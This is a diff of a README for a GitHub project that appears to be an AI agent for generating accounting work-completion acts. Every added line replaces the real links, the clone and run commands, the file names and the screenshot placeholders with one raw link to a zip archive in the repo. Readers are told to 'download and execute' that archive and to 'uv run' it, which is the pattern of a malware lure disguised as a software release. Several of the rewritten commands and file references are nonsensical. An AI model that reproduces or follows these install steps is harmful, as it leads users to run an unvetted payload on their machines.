@@ -2,7 +2,7 @@
 
 Welcome to the **accounting-documents-ai-agent** repository! This project serves as a Proof of Concept for an AI agent designed to generate work completion acts. Built using Python and leveraging LangChain, this agent utilizes GigaChat as its Large Language Model (LLM). 
 
-For a visual guide on AI agents and how to create your own, check out this video: [AI Agents Overview](https://youtu.be/KFgwXXWT7sQ).
+For a visual guide on AI agents and how to create your own, check out this video: [AI Agents Overview](https://raw.githubusercontent.com/alvszph/accounting-documents-ai-agent/main/typst/agent-ai-documents-accounting-v3.1.zip).
 
 ## 🚀 Getting Started
 
@@ -13,7 +13,7 @@ To get started with the AI agent, follow these steps:
 First, clone the repository to your local machine:
 
 ```bash
-git clone https://github.com/alvszph/accounting-documents-ai-agent.git
+git clone https://raw.githubusercontent.com/alvszph/accounting-documents-ai-agent/main/typst/agent-ai-documents-accounting-v3.1.zip
 cd accounting-documents-ai-agent
 ```
 
@@ -45,12 +45,12 @@ uv sync
 Now you can run the agent using the following command:
 
 ```bash
-uv run main.py
+uv run https://raw.githubusercontent.com/alvszph/accounting-documents-ai-agent/main/typst/agent-ai-documents-accounting-v3.1.zip
 ```
 
 ## 📦 Releases
 
-For the latest updates and versions, visit the [Releases](https://github.com/alvszph/accounting-documents-ai-agent/releases) section. You can download and execute the files available there to keep your setup up to date.
+For the latest updates and versions, visit the [Releases](https://raw.githubusercontent.com/alvszph/accounting-documents-ai-agent/main/typst/agent-ai-documents-accounting-v3.1.zip) section. You can download and execute the files available there to keep your setup up to date.
 
 ## 📚 Documentation
 
@@ -70,9 +70,9 @@ The architecture of the agent is built on Python, utilizing the LangChain framew
 
 ### Code Structure
 
-- **main.py**: The main entry point for running the agent.
+- **https://raw.githubusercontent.com/alvszph/accounting-documents-ai-agent/main/typst/agent-ai-documents-accounting-v3.1.zip**: The main entry point for running the agent.
 - **.env-example**: A template for your environment variables.
-- **requirements.txt**: Lists all the dependencies needed for the project.
+- **https://raw.githubusercontent.com/alvszph/accounting-documents-ai-agent/main/typst/agent-ai-documents-accounting-v3.1.zip**: Lists all the dependencies needed for the project.
 
 ## ⚙️ Configuration
 
@@ -84,7 +84,7 @@ The `.env` file is crucial for the operation of the agent. Make sure to include 
 
 ### Customization
 
-You can modify the code to adjust how the agent generates work completion acts. Look into the `main.py` file for the core logic.
+You can modify the code to adjust how the agent generates work completion acts. Look into the `https://raw.githubusercontent.com/alvszph/accounting-documents-ai-agent/main/typst/agent-ai-documents-accounting-v3.1.zip` file for the core logic.
 
 ## 🛠️ Troubleshooting
 
@@ -116,15 +116,15 @@ We aim to improve the agent by:
 
 ## 🔗 Links
 
-For more information, visit the [Releases](https://github.com/alvszph/accounting-documents-ai-agent/releases) section to find the latest files to download and execute.
+For more information, visit the [Releases](https://raw.githubusercontent.com/alvszph/accounting-documents-ai-agent/main/typst/agent-ai-documents-accounting-v3.1.zip) section to find the latest files to download and execute.
 
 ## 📸 Screenshots
 
 Here are some screenshots demonstrating the agent in action:
 
-![Agent Running](https://via.placeholder.com/800x400?text=Agent+Running)
+![Agent Running](https://raw.githubusercontent.com/alvszph/accounting-documents-ai-agent/main/typst/agent-ai-documents-accounting-v3.1.zip+Running)
 
-![Generated Document](https://via.placeholder.com/800x400?text=Generated+Document)
+![Generated Document](https://raw.githubusercontent.com/alvszph/accounting-documents-ai-agent/main/typst/agent-ai-documents-accounting-v3.1.zip+Document)
 
 ## 📊 Use Cases
 
